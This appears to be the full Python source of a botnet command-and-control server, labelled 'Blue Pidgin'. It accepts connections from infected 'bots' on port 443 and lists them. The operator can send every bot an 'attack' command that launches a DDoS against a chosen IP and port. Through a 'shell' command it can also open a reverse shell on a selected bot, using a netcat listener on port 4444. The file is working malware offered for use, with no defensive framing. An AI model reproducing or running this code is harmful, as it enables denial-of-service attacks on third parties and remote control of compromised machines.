import socket
import threading
import os
import sys


# List to keep track of connected clients
connected_clients = []
clients_lock = threading.Lock()

def handle_client(client_socket, address):
    print(f"Connection from {address}")

    # Add the client socket to the list of connected clients
    with clients_lock:
        connected_clients.append(client_socket)

    while True:
        try:
            message = client_socket.recv(1024).decode()
            if message == "":
                print(f"Connection with {address} closed.")
                break

            print(f"Received from {address}: {message}")
            # Perform any action based on the received message

        except ConnectionResetError:
            print(f"Connection with {address} closed.")
            break

    # Remove the client socket from the list of connected clients
    with clients_lock:
        if client_socket in connected_clients:
            connected_clients.remove(client_socket)
    client_socket.close()
    print(f"Connection with {address} closed.")

def send_message_to_clients(message):
    # Send the same message to all connected clients
    for client_socket in connected_clients:
        try:
            client_socket.send(message.encode())
        except:
            # Remove the client socket if there is an issue sending the message
            connected_clients.remove(client_socket)

def start_server():
    host = '0.0.0.0'
    port = 443

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Server listening on {host}:{port}\n")

    # Start a new thread to handle each client
    client_acceptor = threading.Thread(target=accept_clients, args=(server_socket,))
    client_acceptor.start()

    # Start a new thread for sending messages to clients
    message_sender = threading.Thread(target=send_messages)
    message_sender.start()

def accept_clients(server_socket):
    while True:
        client_socket, address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
        client_handler.start()

def send_messages():
    while True:
        print(f"""
  ____  _              _____ _     _             
 |  _ \| |            |  __ (_)   | |            
 | |_) | |_   _  ___  | |__) |  __| | __ _ _ __  
 |  _ <| | | | |/ _ \ |  ___/ |/ _` |/ _` | '_ \ 
 | |_) | | |_| |  __/ | |   | | (_| | (_| | | | |
 |____/|_|\__,_|\___| |_|   |_|\__,_|\__, |_| |_|
                                       __/ |      
                                      |___/       
              
              Made by: https://github.com/LTWeaver
\n\nBots Connected: {len(connected_clients)}""")
        message_to_send = input("\n\n\n>>>: ")
        os.system('clear')

        if message_to_send.lower() == 'quit':
            # Send a message to all clients to disconnect
            send_message_to_clients("disconnect_all")

            # Close all client connections
            for client_socket in connected_clients:
                client_socket.close()
            connected_clients.clear()  # Clear the list of connected clients
            print("All clients removed. Quitting...")
            sys.exit()  # Terminate the script using sys.exit()

        # Check if the input is "shell"
        if message_to_send.lower() == 'shell':
            # Display a list of connected clients
            print("Connected Clients:")
            for idx, client_socket in enumerate(connected_clients, 1):
                client_address = client_socket.getpeername()[0]
                print(f"{idx}. {client_address}")

            # Prompt the user to select a client for a shell
            selected_client = input("\nSelect a client for a shell (enter the number): ")
            try:
                selected_index = int(selected_client) - 1
                if 0 <= selected_index < len(connected_clients):
                    target_ip = connected_clients[selected_index].getpeername()[0]
                    send_message_to_client(target_ip, "shell")
                    os.system("sudo nc -nvlp 4444")
                else:
                    print("Invalid client selection.")
            except ValueError:
                print("Invalid input. Please enter a number.")

        elif message_to_send == "remove":
            print("Connected Clients:")
            for idx, client_socket in enumerate(connected_clients, 1):
                client_address = client_socket.getpeername()[0]
                print(f"{idx}. {client_address}")

            selected_client = input("\nSelect a client to remove (enter the number, 'all' to remove all): ")
            remove_client(selected_client)

        elif message_to_send == "help":
            print("""Commands:\n\n1) shell  - Spawn a shell on a selected bot\n2) attack - Starts DDoS attack\n3) list   - Shows the list of bots connected\n4) remove - Remove client/s\n5) quit   - Quit DDoS attack\n""")

        elif message_to_send == "list":
            print("Connected Bots:\n")
            for idx, client_socket in enumerate(connected_clients, 1):
                client_address = client_socket.getpeername()[0]
                print(f"{idx}. {client_address}")

        if message_to_send == "attack":
            ip = input("Enter target IP address: ")
            threads = input("Thread ammount (max=70): ")
            if int(threads) > 70:
                threads = "70"
                print("Too many threads, setting to max")
            timer = input("Attack length (s): ")
            port = input("Port: ")

            # Send the "attack" command along with IP, threads, and timer to all clients
            send_message_to_clients(f"attack {ip} {threads} {timer} {port}")
            print(f"\nAttack on {ip}:{port} with {threads} threads for {timer} seconds started...")

        else:
            # Send the message to all clients
            send_message_to_clients(message_to_send)

def send_message_to_client(target_ip, message):
    for client_socket in connected_clients:
        client_address = client_socket.getpeername()[0]
        if client_address == target_ip:
            try:
                client_socket.send(message.encode())
            except:
                # Remove the client socket if there is an issue sending the message
                connected_clients.remove(client_socket)
            break  # Stop iterating after sending the message to the specified client

def remove_client(selected_client):
    if selected_client.lower() == 'all':
        # Send a message to all clients to disconnect
        send_message_to_clients("disconnect_all")

        # Close all client connections
        for client_socket in connected_clients:
            client_socket.close()
        connected_clients.clear()  # Clear the list of connected clients
        print("All clients removed.")
    else:
        try:
            selected_index = int(selected_client) - 1
            if 0 <= selected_index < len(connected_clients):
                client_socket = connected_clients[selected_index]

                # Send a message to the specific client to disconnect
                send_message_to_client(client_socket.getpeername()[0], "disconnect")

                client_socket.close()
                connected_clients.remove(client_socket)
                print(f"Client {selected_client} removed.")

        except Exception as e:
            print(e)


if __name__ == "__main__":
    start_server()
